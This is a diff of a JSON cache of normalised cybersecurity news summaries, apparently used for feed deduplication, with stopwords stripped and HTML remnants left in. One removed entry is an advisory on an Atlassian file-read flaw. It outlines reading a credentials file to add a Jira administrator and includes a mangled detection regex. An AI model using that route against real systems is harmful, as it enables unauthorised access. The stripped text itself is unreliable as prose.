@@ -2,174 +2,6 @@
   "counts": {},
   "history": [
     {
-      "norm": "sonicwall warns max severity ssrf flaw sma1000 gateways sonicwall released hotfixes address maximum severity server side request forgery ssrf flaw sma1000 series appliances",
-      "ts": 1791377579.9151998
-    },
-    {
-      "norm": "android s october 2026 updates patch 25 vulnerabilities p patches resolve critical vulnerability android s system component could lead privilege escalation p p post href october 2026 updates patch 25 vulnerabilities appeared first href",
-      "ts": 1791377580.413159
-    },
-    {
-      "norm": "hackers exploit critical atlassian flaw after public poc release critical vulnerability cve 2026 21589 affecting multiple atlassian product families including jira confluence bitbucket being exploited attacks do not require authentication",
-      "ts": 1791377589.3031454
-    },
-    {
-      "norm": "advantest discloses data breach months after ransomware attack p japanese chip testing giant said hackers stole personal information servers february 2026 cyberattack p p post href discloses data breach months after ransomware attack appeared first href",
-      "ts": 1791377589.303165
-    },
-    {
-      "norm": "cve 2026 21589 critical unauthenticated arbitrary file access atlassian products h2 style direction ltr overview h2 p style direction ltr span style font size undefined october 5 2026 atlassian span href style font size undefined published security advisory span span style font size undefined span href style font size undefined cve 2026 21589 span span style font size undefined critical arbitrary file access vulnerability affecting eight products bitbucket data center confluence data center jira service management data center jira software data center bamboo data center crowd data center crucible fisheye atlassian assigned vulnerability cvssv4 score span href style font size undefined 9 3 span span style font size undefined unauthenticated remote attacker who knows target file s exact name path can access within application s web root vulnerability does not provide directory listing enumeration span p p style direction ltr span style font size undefined atlassian s advisory treats all versions before applicable fixed releases affected including unsupported versions affected atlassian cloud products already been patched no action required cloud customers span p p style direction ltr span style font size undefined detailed technical analysis file read proof concept scripts public so rapid7 recommends patching emergency basis outside normal patch cycles reviewing access logs attempted exploitation span p h2 style direction ltr technical overview h2 p style direction ltr href style font size undefined nvd span span style font size undefined lists files directories accessible external parties span href style font size undefined cwe 552 span span style font size undefined weakness associated cve 2026 21589 span p p style direction ltr span style font size undefined october 6 watchtowr labs span href style font size undefined published technical analysis span span style font size undefined based comparisons vulnerable patched jira confluence bitbucket packages their analysis identified path traversal vulnerability atlassian s web resource handling double colon span span style color rgb 24 128 56 font size undefined span span style font size undefined sequences can become path separators during request processing allowing traversal components reach resource loading code resulting contents arbitrary file being read back attacker span p p style direction ltr span style font size undefined their testing could not traverse outside tomcat context but could read files throughout application web root atlassian crowd deployment had jira configured reading span span style color rgb 24 128 56 font size undefined web inf classes crowd properties span span style font size undefined exposed application credentials network access crowd they used those credentials create user add span span style color rgb 24 128 56 font size undefined jira administrators span span style font size undefined crowd s ip allowlisting can block this direct route span p h2 style direction ltr mitigation guidance h2 p style direction ltr span style font size undefined organizations should upgrade each affected installation listed fixed version latest available version atlassian s october 5 advisory lists following fixed versions span p table thead tr th p style direction ltr span style font size undefined strong product strong span p th th p style direction ltr span style font size undefined strong fixed versions strong span p th tr thead tbody tr td p style direction ltr span style font size undefined bitbucket data center span p td td p style direction ltr span style color rgb 24 128 56 font size undefined 9 4 26 span span style font size undefined span span style color rgb 24 128 56 font size undefined 10 2 8 span span style font size undefined span span style color rgb 24 128 56 font size undefined 10 5 1 span p td tr tr td p style direction ltr span style font size undefined confluence data center span p td td p style direction ltr span style color rgb 24 128 56 font size undefined 9 2 26 span span style font size undefined span span style color rgb 24 128 56 font size undefined 10 2 19 span p td tr tr td p style direction ltr span style font size undefined jira service management data center span p td td p style direction ltr span style color rgb 24 128 56 font size undefined 5 12 40 span span style font size undefined span span style color rgb 24 128 56 font size undefined 10 3 26 span span style font size undefined span span style color rgb 24 128 56 font size undefined 11 3 12 span p td tr tr td p style direction ltr span style font size undefined jira software data center span p td td p style direction ltr span style color rgb 24 128 56 font size undefined 9 12 40 span span style font size undefined span span style color rgb 24 128 56 font size undefined 10 3 26 span span style font size undefined span span style color rgb 24 128 56 font size undefined 11 3 12 span p td tr tr td p style direction ltr span style font size undefined bamboo data center span p td td p style direction ltr span style color rgb 24 128 56 font size undefined 10 2 24 span span style font size undefined span span style color rgb 24 128 56 font size undefined 12 1 12 span p td tr tr td p style direction ltr span style font size undefined crowd data center span p td td p style direction ltr span style color rgb 24 128 56 font size undefined 6 3 7 span span style font size undefined span span style color rgb 24 128 56 font size undefined 7 0 3 span span style font size undefined span span style color rgb 24 128 56 font size undefined 7 1 7 span span style font size undefined span span style color rgb 24 128 56 font size undefined 7 2 4 span p td tr tr td p style direction ltr span style font size undefined crucible span p td td p style direction ltr span style color rgb 24 128 56 font size undefined 4 9 15 span p td tr tr td p style direction ltr span style font size undefined fisheye span p td td p style direction ltr span style color rgb 24 128 56 font size undefined 4 9 15 span p td tr tbody table p p p style direction ltr span style font size undefined organizations unable patch immediately should remove affected instances internet otherwise restrict them external network access atlassian provides web application firewall proxy rule all affected products tomcat rewritevalve mitigation confluence jira service management jira software bamboo crowd separate span span style color rgb 24 128 56 font size undefined urlrewrite xml span span style font size undefined rule bitbucket these mitigations limited not replacements patching span p p style direction ltr span style font size undefined rapid7 strongly recommends looking signs compromise even after patch been applied atlassian recommends url decoding each access log request line up twice then searching span span style color rgb 24 128 56 font size undefined span span style font size undefined immediately adjacent span span style color rgb 24 128 56 font size undefined span span style font size undefined span span style color rgb 24 128 56 font size undefined span span style font size undefined span span style color rgb 24 128 56 font size undefined span span style font size undefined alternatively search raw logs vendor supplied regex span p pre 25 2f 5c 25 3a 2 25 2e 2 25 2f 5c 25 3a 2 25 3b pre p p p style direction ltr span style font size undefined public testing artifacts jira confluence bitbucket include span href style font size undefined python file read poc span span style font size undefined span href style font size undefined nuclei template span span style font size undefined if investigation identifies access protected configuration files organizations should rotate exposed credentials other secrets after containing affected systems span p p style direction ltr span style font size undefined latest mitigation investigation guidance please refer span href style font size undefined vendor security advisory span span style font size undefined span p h2 style direction ltr rapid7 customers h2 h3 style direction ltr span style color rgb 67 67 67 exposure command vulnerability management nexpose span h3 p style direction ltr span style font size undefined exposure command vulnerability management nexpose customers can assess exposure cve 2026 21589 unauthenticated vulnerability checks jira software data center expected available october 8 content release span p h2 style direction ltr updates h2 ul li style direction ltr p style direction ltr span style font size undefined strong october 7 2026 strong span span style font size undefined initial publication span p li ul",
-      "ts": 1791377589.3031695
-    },
-    {
-      "norm": "sixth voice ciso data shows cyber risk moved inside workflow 2026 findings not just year over year shift they mark latest point five year arc where resilience ai governance human risk board scrutiny converging inside systems where work actually happens years enterprise cybersecurity story been told straight line escalation more attacks more data loss more pressure more urgency",
-      "ts": 1791377589.3031728
-    },
-    {
-      "norm": "telegram account behind asos rogue notification tied gaming trading group ib researcher found telegram account linked unauthorized asos customer notification previously engaged gaming item trading",
-      "ts": 1791377589.3031764
-    },
-    {
-      "norm": "fbi warns fortibleed remains active after amassing 86 644 fortinet device credentials u s federal bureau investigation fbi secret service usss tuesday warned fortibleed credential harvesting campaign remains active threat aimed internet facing fortinet fortigate firewalls secure socket layer ssl virtual private network vpn gateways campaign exploits reused leaked credentials legacy sha 256 password storage enabling threat",
-      "ts": 1791377589.3031793
-    },
-    {
-      "norm": "atlassian data center flaw draws exploitation attempts within two hours public details threat actors begun exploit newly disclosed critical security flaw impacting atlassian data center products could allow access sensitive files under certain conditions arbitrary file access flaw tracked cve 2026 21589 cvss score 9 3 affects multiple products including bitbucket data center confluence data center jira service management data center jira software",
-      "ts": 1791377589.303182
-    },
-    {
-      "norm": "agentic pentesting proves where stops if you re evaluating agentic pentesting solution right now you ve probably heard same pitch more than once point target discovers validates exploits attack paths autonomously way real attacker would promise worth taking seriously s also worth pressure testing three questions do heavy lifting can assessment actually",
-      "ts": 1791377589.303185
-    },
-    {
-      "norm": "hackers hijack three country code domain registries obtain https certificates google domains p attackers who took control three country code top level domains cctlds used access obtain https certificates several google domains domains run other large organizations google disclosed tuesday attackers compromised third party operators gh ghana sl sierra leone american samoa cctlds putting every domain under those endings risk then changed authoritative dns records these incidents did not involve compromise google s systems href rel nofollow more span class meta nav span p p post href hijack three country code domain registries obtain https certificates google domains appeared first href net security p",
-      "ts": 1791377589.303188
-    },
-    {
-      "norm": "apple s verified photography system p apple just href system called reference image can verify image exactly taken iphone models only without tying specific iphone photographer can also verify multiple images came same iphone p blockquote p other industry solutions require photographer institution vouch image using their own credentials we concerned this puts some photographers such those operating conflict zones difficult position should not necessary forgo anonymity order prove image authenticity we built apple reference image avoid using explicit public credential photographers avoid even implicit public association between different photos taken same sensor final reference image instead signed apple s signing service after validation pcc signature backed apple s strongest technical guarantees p blockquote",
-      "ts": 1791377589.3031912
-    },
-    {
-      "norm": "fortibleed still bleeding nuisance fbi confirms ongoing attacks tens thousands more victims more ransomware groups getting act",
-      "ts": 1791377589.3031938
-    },
-    {
-      "norm": "chrome 155 update patches 247 vulnerabilities p four critical severity use after free defects fixed chromecast browser navigation track p p post href 155 update patches 247 vulnerabilities appeared first href",
-      "ts": 1791377589.3031967
-    },
-    {
-      "norm": "asos incident when attackers use channels customers trust p style direction ltr span style font size undefined asos customers opened their phones find hostile push notification delivered through retailer s own app message claimed company s snowflake environment had been compromised directed asos engage sender through telegram span href style font size undefined asos later confirmed sky news span span style font size undefined unauthorized customer notification had been sent said investigating activity involving third party platforms used communicate customers company also said basic personal information including names contact details may been accessed while payment card information account passwords not believed affected span p p style direction ltr span style font size undefined attackers wider claims remain unverified snowflake told sky news investigation had found no compromise snowflake platform point even without knowing full route into asos s environment though notification raises useful question security teams happens when attacker can communicate through channel customers already trust span p h2 style direction ltr when message comes real app h2 p style direction ltr span style font size undefined most security awareness advice assumes there something suspicious recipient notice sender might unfamiliar domain slightly wrong request out character those checks become much less useful when message arrives through genuine app sitting someone s phone span p p style direction ltr span style font size undefined attackers already been moving this direction elsewhere span href style font size undefined rapid7 research into calendar based phishing span span style font size undefined showed malicious content can appear inside familiar workflows while our earlier look span href style font size undefined social engineering evolving span span style font size undefined explored growing use collaboration tools other everyday platforms make attacks feel routine span p p style direction ltr span style font size undefined asos incident moves problem into customer facing environment once attacker access system can speak behalf business trust built around system can work attacker s favor too span p p style direction ltr span style font size undefined em let s face attacker would much rather borrow trust already exists than spend time building their own our recent em span href style font size undefined em zimbra research em span span style font size undefined em good example because once you can impersonate sender edit calendar inside platform everything victim checks lives system they no reason question i can t say this one happened but notification coming out real app gives attacker same head start there no strange domain unfamiliar sender catch so activity can look lot like normal tuesday afternoon em span span style font size undefined douglas mckee span span style color rgb 29 28 29 font size undefined director vulnerability intelligence rapid7 span p h2 style direction ltr suspicious activity looks like inside legitimate services h2 p style direction ltr span style font size undefined attacker does not always need obviously malicious infrastructure create damage legitimate account integration saas platform used unexpected way can provide access employees customers partners while generating activity may look relatively ordinary when viewed own span p p style direction ltr span style font size undefined if customer communications service suddenly sends unusual notification security team needs understand happened around who accessed platform whether credentials permissions changed which connected services involved whether suspicious activity appeared elsewhere environment span p p style direction ltr span style font size undefined asos said activity involved third party platforms used customer communications while span href style font size undefined techradar reported span span style font size undefined claimed snowflake connection could potentially been indirect through services running platform rather than evidence compromise snowflake itself kind environment can leave investigators working across several providers identities systems before they complete picture happened span p h2 style direction ltr mdr follow activity across environment h2 p style direction ltr span style font size undefined when attackers use legitimate identities integrations cloud services communication platforms analysts need connect behavior across systems rather than depend known bad ip address malware signature tell story unexpected authentication permission change third party access unusual activity customer facing service may not enough raise alarm independently but sequence can reveal much clearer pattern span p p style direction ltr span style font size undefined preemptive mdr approach brings those signals together across endpoints identities cloud environments other parts attack surface so analysts can investigate activity context businesses now rely growing number saas services external platforms can act their behalf although security teams may not operate every one those systems directly they still need understand access they hold they connect wider environment misuse would surface span p p style direction ltr span style font size undefined becomes particularly relevant when third party service can communicate externally organization s name access platform only part picture teams also need visibility into access being used whether activity elsewhere suggests account integration been compromised span p h2 style direction ltr first message can create second wave risk h2 p style direction ltr span style font size undefined visible incident can give other attackers useful material once customers know something happened phishing email text offering account update refund password reset security check immediately credible event behind span p p style direction ltr href style font size undefined rapid7 research into digital footprint exposure span span style font size undefined shown breached information can combined publicly available data support more convincing phishing impersonation fraud names contact details may appear relatively limited compared passwords payment information but they can still become valuable when combined real incident recognizable brand span p p style direction ltr span style font size undefined investigation therefore support several decisions once understanding technical scope establishing which customer business data may been involved working third party providers assessing regulatory obligations preparing possibility incident reused follow attacks span p p style direction ltr span style font size undefined more customer communication moves through apps saas platforms automated workflows third party services security teams need visibility into those channels being used well who can access them earlier unusual activity can connected across those systems more room analysts investigate respond before trusted channel becomes part much larger incident span p",
-      "ts": 1791377589.303201
-    },
-    {
-      "norm": "sonicwall fixes pre auth ssrf flaw sma 1000 appliances cve 2026 102255 p sonicwall patched four vulnerabilities popular secure mobile access sma 1000 series appliances including one cve 2026 102255 could allow remote unauthenticated attackers direct appliance issue requests their behalf reach internal functionality perform unauthorized operations there currently no evidence any vulnerabilities addressed this release being exploited wild vendor said but one mentioned above could soon given attackers href rel nofollow more span class meta nav span p p post href fixes pre auth ssrf flaw sma 1000 appliances cve 2026 102255 appeared first href net security p",
-      "ts": 1791377589.3032045
-    },
-    {
-      "norm": "musician sent prison 10 million streaming fraud using ai bots north carolina musician sentenced 18 months prison collecting more than 10 million royalties spotify apple music amazon music youtube music massive streaming royalty fraud scheme",
-      "ts": 1791377589.3032072
-    },
-    {
-      "norm": "advantest confirms personal information stolen ransomware attack advantest corporation notifying affected individuals ransomware attack earlier this year exposed their personally identifiable data",
-      "ts": 1791377589.3032098
-    },
-    {
-      "norm": "your windows pc can now reach other pcs through windows app p microsoft made remote pc connections generally available windows app windows users can access physical virtual windows pcs alongside windows 365 azure virtual desktop microsoft dev box resources windows app brings remote windows devices applications into single interface replaces remote desktop app distributed through microsoft store succeeds separate remote desktop client used cloud services built remote desktop connection tool mstsc exe remains supported href rel nofollow more span class meta nav span p p post href windows pc can now reach other pcs through windows app appeared first href net security p",
-      "ts": 1791377589.303213
-    },
-    {
-      "norm": "half cybersecurity pros still rely passwords despite security concerns yubico survey identified significant gap between awareness adoption secure methods authentication enterprises",
-      "ts": 1791377589.3032155
-    },
-    {
-      "norm": "anthropic introduces 3 tier cyber verification program ai access p anthropic integrating cvp project glasswing into single offering three levels access most capable ai models p p post href introduces 3 tier cyber verification program ai access appeared first href",
-      "ts": 1791377589.3032188
-    },
-    {
-      "norm": "one breach please make no mistakes cybersecurity community seen examples autonomous agents built inside ai labs attacking public infrastructure you prepare agentic threats makes difference during real incidents",
-      "ts": 1791377589.303222
-    },
-    {
-      "norm": "asos confirms cyberattack data breach p hackers compromised third party communication platform sent rogue notifications asos users p p post href confirms cyberattack data breach appeared first href",
-      "ts": 1791377589.3032248
-    },
-    {
-      "norm": "asos confirms data breach after hacked app alert reaches shoppers p uk fashion retailer asos confirmed data breach after notification claiming hackers had broken into data sent shoppers through app asos founded 2000 16 5 million active customers more than 100 markets according company s update investors unauthorised notification went out customers around 10am 6 october 2026 we investigating unauthorised activity involving third party platforms we use href rel nofollow more span class meta nav span p p post href confirms data breach after hacked app alert reaches shoppers appeared first href net security p",
-      "ts": 1791377589.303228
-    },
-    {
-      "norm": "pwn2own hackers find 32 zero day vulnerabilities day one ethical hackers already found 32 zero days various products pwn2own ireland",
-      "ts": 1791377589.3032312
-    },
-    {
-      "norm": "anthropic loosens claude s cyber restrictions verified defenders p anthropic expanded cyber verification program cvp giving approved security professionals access advanced claude capabilities fewer automated blocks work such malware analysis vulnerability testing three tiers cybersecurity work program now three tiers based scope applicants cybersecurity work expansion combines cvp project glasswing into single program each tier verification requirements security controls tailored work permits defense access href rel nofollow more span class meta nav span p p post href loosens claude s cyber restrictions verified defenders appeared first href net security p",
-      "ts": 1791377589.303234
-    },
-    {
-      "norm": "danish cpr breach highlights challenge supply chain risk breach 8 8 million citizens danish central register persons cpr occurred via third party access",
-      "ts": 1791377589.3032374
-    },
-    {
-      "norm": "anthropic expands claude access vetted cyber teams glasswing finds 129 000 flaws anthropic tuesday said s expanding program allows vetted cybersecurity professionals test advanced artificial intelligence ai models reduced safeguards blocking classifiers company claimed project glasswing initiative uncovered least 129 000 verified software vulnerabilities between april july 2026 company said also found additional",
-      "ts": 1791377589.3032396
-    },
-    {
-      "norm": "wikimedia says rogue openai agents tried turn tools into proxies p wikimedia looked into whether own websites had seen activity like disclosed other organizations p p post href says rogue openai agents tried turn tools into proxies appeared first href",
-      "ts": 1791377589.3032424
-    },
-    {
-      "norm": "100 compromised websites use fake cloudflare checks deliver lunexstealer computer emergency response team ukraine cert ua identified more than 100 compromised websites been injected malicious javascript serve information stealing malware called lunexstealer aka psychedelic stealer activity which observed agency september 2026 been attributed threat cluster dubbed uac 0277 did not disclose who",
-      "ts": 1791377589.3032477
-    },
-    {
-      "norm": "atlassian patches critical vulnerability affecting 8 products p unauthenticated attackers could exploit flaw access specific files web application root directory p p post href patches critical vulnerability affecting 8 products appeared first href",
-      "ts": 1791377589.303256
-    },
-    {
-      "norm": "ai agent gateway open source tool keeps credentials out agent configs p tuskira s ai agent gateway open source solution sits between ai agents everything they call mcp tool servers connect them services like github jira model providers they send prompts gateway runs your own environment without tuskira account full picture source tuskira team running claude code cursor homegrown ticket bot usually model keys mcp credentials copied into each href rel nofollow more span class meta nav span p p post href agent gateway open source tool keeps credentials out agent configs appeared first href net security p",
-      "ts": 1791377589.3032606
-    },
-    {
-      "norm": "openssh 10 6 enables post quantum signature algorithm so experimental keys need replacing p openssh team released version 10 6 oct 6 said ship releases more often now get bugfixes into users hands more quickly maintainers received large number security reports many found ai models ai help number cases different researcher independently found same bug later adversaries who do not report bugs open source projects maintainers wrote likely href rel nofollow more span class meta nav span p p post href 10 6 enables post quantum signature algorithm so experimental keys need replacing appeared first href net security p",
-      "ts": 1791377589.3032649
-    },
-    {
-      "norm": "ai endpoint management visibility compliance remediation p endpoint estates growing faster than teams look after them hybrid work cloud adoption contractor laptops steady stream cves rising compliance pressure mean security teams manage more devices more software more exceptions than spreadsheet monthly scan can hold manual tracking manual remediation no longer keep up ai endpoint management offers way out used well helps teams see actually href rel nofollow more span class meta nav span p p post href endpoint management visibility compliance remediation appeared first href net security p",
-      "ts": 1791377589.303269
-    },
-    {
-      "norm": "even ot network visibility critical infrastructure operators struggle legacy equipment p large critical infrastructure operators run seven separate security tools average most still cannot see every asset their operational technology ot networks picture palo alto networks survey more than 1 600 security operations leaders old equipment stays network legacy ot most common visibility problem named 52 percent respondents another 42 percent call legacy equipment cannot patched their biggest cybersecurity href rel nofollow more span class meta nav span p p post href ot network visibility critical infrastructure operators struggle legacy equipment appeared first href net security p",
-      "ts": 1791377589.303274
-    },
-    {
-      "norm": "automation ai agents people sorting out who handles each security finding p just over half 200 senior security technology leaders polled armorcode say their organizations struggle simplify their software security programs if they keep working way they do today respondents senior people most them companies 10 000 more employees their worries center happens after scanner flags something someone decide whether flaw matters find out who owns href rel nofollow more span class meta nav span p p post href ai agents people sorting out who handles each security finding appeared first href net security p",
-      "ts": 1791377589.303278
-    },
-    {
-      "norm": "south korean president calls creation tools stop all cyber attacks complete security paradigm refresh needed ai era",
-      "ts": 1791377589.303282
-    },
-    {
-      "norm": "personal information over 1 million people stolen cyberattack arizona s court system p arizona supreme court said information copied people dating back far 30 years p p post href information over 1 million people stolen cyberattack arizona s court system appeared first href",
-      "ts": 1791377589.3032858
-    },
-    {
-      "norm": "beyond asset discovery real life crowdrecon use case explored security teams more ways than ever map assets scan infrastructure track vulnerabilities yet one question often remains difficult answer does skilled researcher consider worth exploring question matters because external exposure not only list internet facing assets also set relationships assumptions possible paths change products domains cloud services business structures evolve automated tools provide essential scale c",
-      "ts": 1791377589.3032897
-    },
-    {
-      "norm": "anthropic reconfigures cool kids security program company s project glasswing cyber verification program metamorphose into triple tier threat hunting club",
-      "ts": 1791377589.303294
-    },
-    {
-      "norm": "quest simplicity smbs want advanced protection without complexity cybersecurity market often making tougher smbs keep threats bay",
-      "ts": 1791377589.3032978
-    },
-    {
-      "norm": "ai boosts soc analyst capacity but limits skill development swimlane finds ai reducing repetitive work soc teams but some feel their careers may suffer",
-      "ts": 1791377589.3033018
-    },
-    {
       "norm": "shinyhunters extorted boeing spin off prior arrests teenager amman jordan suspected leading prolific data theft extortion group shinyhunters been detained reportedly cooperating fbi identify other members hacking gang krebsonsecurity learned suspect who uses hacker handle rey detained shinyhunters process extorting business unit recently divested global aerospace company boeing which manufactures fleet planes used employer rey s father royal jordanian airlines",
       "ts": 1791413552.735208
     },
@@ -2452,6 +2284,166 @@
     {
       "norm": "critical healthcare systems aren t quantum ready study 2 5 million devices across 50 healthcare organizations suggests sector long way go getting ready post quantum cryptography era",
       "ts": 1791977131.3663146
+    },
+    {
+      "norm": "north macedonian police arrest alleged administrator behind olvx cybercrime market raid home north macedonian village led arrest suspected administrator olvx market according balkan country s interior ministry along fbi",
+      "ts": 1792012975.3479354
+    },
+    {
+      "norm": "yam store phishing network behind billion messages sprawling cybercrime marketplace supplied cloud infrastructure phishing kits helped fuel more than 1 billion phishing messages worldwide",
+      "ts": 1792012975.3479555
+    },
+    {
+      "norm": "brooklyn da s office disrupts crypto scam targeting russian community russian speaking brooklyn residents began tipping off local authorities cryptocurrency fraud scheme three years ago leading operation take down associated servers domains",
+      "ts": 1792012975.3479595
+    },
+    {
+      "norm": "anthropic sneakpeek flaw silent zero click threat bug claude code desktop s preview pane can allow adversaries quietly steal credentials developers including ssh private keys aws credentials claude 0auth tokens",
+      "ts": 1792012975.3479621
+    },
+    {
+      "norm": "fbi raids dprk worker laptop farms texas us nationals arrested u s department justice doj disrupted famous chollima threat group s operations arresting two suspects charging 14 individuals seizing nearly 187 laptops used north korean remote worker schemes",
+      "ts": 1792012975.3479648
+    },
+    {
+      "norm": "security researchers spent 6 days doing their chromework built 1b user exploit xbow earned 250k bug bounty all ai model got lousy t shirt",
+      "ts": 1792012975.3479679
+    },
+    {
+      "norm": "cisco warns active attacks exploiting critical secure email gateway vulnerability attackers exploiting critical flaw cisco secure email gateway lets sender no login write files appliance s operating system cisco said advisory wednesday attacker sends email crafted attachment through gateway if succeeds could then run commands root appliance filters organization s email spam malware",
+      "ts": 1792012975.3479705
+    },
+    {
+      "norm": "ledger asks sellers across asia halt sales after supply chain attack ledger asked resellers distributors wallets indonesia singapore thailand philippines vietnam malaysia hong kong suspend device sales remove products shelves while investigates device tampering",
+      "ts": 1792012975.347973
+    },
+    {
+      "norm": "microsoft drops actively exploited zero day among record high 1 413 vulnerabilities p october patch tuesday tech giant addressed more defects one month than any annual total record nearly 4 5 vulnerabilities affect windows p p post href drops actively exploited zero day among record high 1 413 vulnerabilities appeared first href",
+      "ts": 1792012975.3479757
+    },
+    {
+      "norm": "hackers backdoor nextcloud servers through critical flaw collabora s built code app attackers exploited flaw optional nextcloud app collabora online built code server plant web shells nextcloud servers three administrators reported issue github first logged attack september 10 web shell small file executes any command attacker sends via web request rights web server account flaw",
+      "ts": 1792012975.3479784
+    },
+    {
+      "norm": "cisco patches secure email gateway zero day exploited attacks cisco patched another actively exploited zero day flaw secure email gateway seg lets remote unauthenticated attackers execute commands root privileges",
+      "ts": 1792012975.3479812
+    },
+    {
+      "norm": "ivanti patches connect secure zero day after researchers confirm wild attacks vendor promises fix separate privilege escalation flaw coming weeks",
+      "ts": 1792012975.3479838
+    },
+    {
+      "norm": "microsoft disrupts 3 phishing kits linked over 1 billion scam messages microsoft health isac along japan cybercrime control center jc3 coalition private sector companies such resecurity cloudflare oracle proofpoint trm labs announced disruption three phishing kits cogui aka nx fa haozi aka phoenix iron man system since january 2026 threat actors behind these kits been responsible",
+      "ts": 1792012975.3479903
+    },
+    {
+      "norm": "spyware manufacturer had access data harvested former polish government current pm says prime minister donald tusk who ordered investigation monday called sprawling spyware operation spearheaded country s previous ruling party one biggest scandals polish history since fall communism",
+      "ts": 1792012975.3479958
+    },
+    {
+      "norm": "u s shuts down over 40 laptop farms charges 14 north korean worker fraud u s department justice doj tuesday charged 14 people seized about 187 computers part ongoing efforts disrupt north korea s fraudulent remote worker itw scheme indictment charges mix u s citizens chinese nationals their roles worker conspiracy affecting more than 70 u s companies charging them wire fraud conspiracy money",
+      "ts": 1792012975.3479996
+    },
+    {
+      "norm": "upcoming speaking engagements p this current list where when i am scheduled speak p ul li i m speaking href democracy rebuilt montreal canada event runs october 21 23 2026 my talk wednesday october 21 li li i m speaking href toronto toronto ontario canada 5 pm et october 22 2026 li li i m speaking href san francisco california event runs october 27 29 2026 my talk 11 35 am pt thursday october 29 li li i m speaking href summit brampton ontario canada wednesday november 18 2026 li ul",
+      "ts": 1792012975.3480034
+    },
+    {
+      "norm": "ai agents navigate unfamiliar ot systems move equipment minutes booz allen finds p booz allen s isolated ot lab ai models met every objective across eight scenarios reached industrial control network perimeter compromise just over 16 minutes p p post href agents navigate unfamiliar ot systems move equipment minutes booz allen finds appeared first href",
+      "ts": 1792012975.3480072
+    },
+    {
+      "norm": "ics patch tuesday siemens issues 17 advisories rockwell fixes armorblock takeover flaw p abb previously published advisory warning about possible probing dynovapro vulnerability p p post href patch tuesday siemens issues 17 advisories rockwell fixes armorblock takeover flaw appeared first href",
+      "ts": 1792012975.348011
+    },
+    {
+      "norm": "senators press trump admin rally federal government around ai safety security p letter argues federal agencies should more rigorously test ai models security threats sandbox evasion set safety standards lean into defensive ai p p post href press trump admin rally federal government around ai safety security appeared first href",
+      "ts": 1792012975.3480144
+    },
+    {
+      "norm": "microsoft fixes vpn issues caused september windows updates microsoft resolved known issue caused always vpn connection issues after installing september 2026 windows 11 security updates",
+      "ts": 1792012975.3480177
+    },
+    {
+      "norm": "future ai cryptanalysis p matthew green href href href rather pessimistic series posts about potential ai systems vastly outperform humans cryptanalysis both symmetric public key ciphers p p i am more optimistic than he i stronger faith over engineering cryptographers tend do i am trying write this up more detail p",
+      "ts": 1792012975.348021
+    },
+    {
+      "norm": "u k sanctions cryptomus ru money laundering united kingdom issued economic sanctions against cryptomus chameleonic cryptocurrency platform experts say serves major conduit payments related ransomware narcotics darknet markets fraud cybercrime services helping russia circumvent existing financial restrictions",
+      "ts": 1792012975.3480248
+    },
+    {
+      "norm": "cyberattack connected fridges france p another iot href this one france p blockquote p hackers gained control software regulates temperatures refrigeration units forcing some warm 50c 120f overnight according one supermarket chain affected p p p p normally supermarket freezers go through short period defrosting overnight which temperatures rise slightly but hackers ordered units heat up stay hot although danfoss did not confirm any reports about just warm fridges freezers could become process p p danfoss said affected cold units older models whose security software could not updated ward off risk they had identified p blockquote",
+      "ts": 1792012975.3480306
+    },
+    {
+      "norm": "harmonic security raises 50 million workforce ai protection p cybersecurity startup plans expand engineering go market teams us uk p p post href security raises 50 million workforce ai protection appeared first href",
+      "ts": 1792012975.3480341
+    },
+    {
+      "norm": "blind spots agentic pentesting close them ai powered penetration testing can uncover complex attack paths but safety restrictions network limitations leave many assets vulnerabilities untested picus security explains combining agentic pentesting exposure validation breach simulation can help close these gaps",
+      "ts": 1792012975.348038
+    },
+    {
+      "norm": "romulus malware server leverages clickfix deliver multiple payloads researchers forescout said discovery shows clickfix evolving delivery technique into full blown cyber criminal infrastructure",
+      "ts": 1792012975.3480418
+    },
+    {
+      "norm": "break silence kazakhstan nexus uat 6275 targets cis government organizations talos recorded future identified uat 6275 activity targeting government organizations across commonwealth independent states recovered artifacts show additional interest water resources energy",
+      "ts": 1792012975.348046
+    },
+    {
+      "norm": "virtual event today zero trust strategies summit p this summit laser focused next generation zero trust identity security moving beyond theory deliver actionable strategies p p post href event today zero trust strategies summit appeared first href",
+      "ts": 1792012975.34805
+    },
+    {
+      "norm": "microsoft takes down 3 major phishing platforms used chinese cybercriminals tech giant worked japan s national police agency healthcare cybersecurity organization health isac obtain u s court order seizing redirecting domains part infrastructure underlying yam store cogui iron man",
+      "ts": 1792012975.348054
+    },
+    {
+      "norm": "global takedown hits network behind 1 billion phishing messages massive cybercriminal ecosystem facilitating more than billion malicious messages targeting over 75 000 organizations across 150 countries been disrupted law enforcement agencies partners worldwide",
+      "ts": 1792012975.3480585
+    },
+    {
+      "norm": "russian travel booking platform suspends reservations after cyberattack customers russian travel website anywayanyday unable book tickets hotel rooms company responded cyberattack",
+      "ts": 1792012975.3480618
+    },
+    {
+      "norm": "fbi raids 40 laptop farms helping north korea pocket us tech salaries p north korean workers used stolen fabricated identities land remote jobs more than 70 us companies help americans who allegedly kept company issued laptops running their homes according us department justice arrests ohio raids texas michael james bostelle pennsylvania juan cecilio pena carrillo texas taken into custody under ohio indictment wire fraud money laundering identity theft same href rel nofollow more span class meta nav span p p post href raids 40 laptop farms helping north korea pocket us tech salaries appeared first href net security p",
+      "ts": 1792012975.348066
+    },
+    {
+      "norm": "download security field guide ai adoption p security teams under pressure adopt ai but many seeing opposite promised tools demo well don t hold up real workflows complexity increases trust breaks down instead reducing workload ai can introduce risks oversight burdens this guide breaks down ai adoption fails practice gives teams clearer path forward evaluation implementation humans loop href rel nofollow more span class meta nav span p p post href security field guide ai adoption appeared first href net security p",
+      "ts": 1792012975.34807
+    },
+    {
+      "norm": "russian influence operation widely targeting latin america ai enabled operation used spoofed emails fake government documents creation local organization target schools peru ecuador among other efforts",
+      "ts": 1792012975.3480742
+    },
+    {
+      "norm": "microsoft disrupts chinese language phishing market behind 1b messages p backed federal court order microsoft health isac seized domains powering yam store cogui iron man p p post href disrupts chinese language phishing market behind 1b messages appeared first href",
+      "ts": 1792012975.348078
+    },
+    {
+      "norm": "microsoft partners disrupt vast chinese language phishing kit ecosystem p less than 10 months cybercriminals used arsenal customized targeted phishing kits send more than 1 billion malicious messages more than 75 000 organizations globally p p post href partners disrupt vast chinese language phishing kit ecosystem appeared first href",
+      "ts": 1792012975.3480814
+    },
+    {
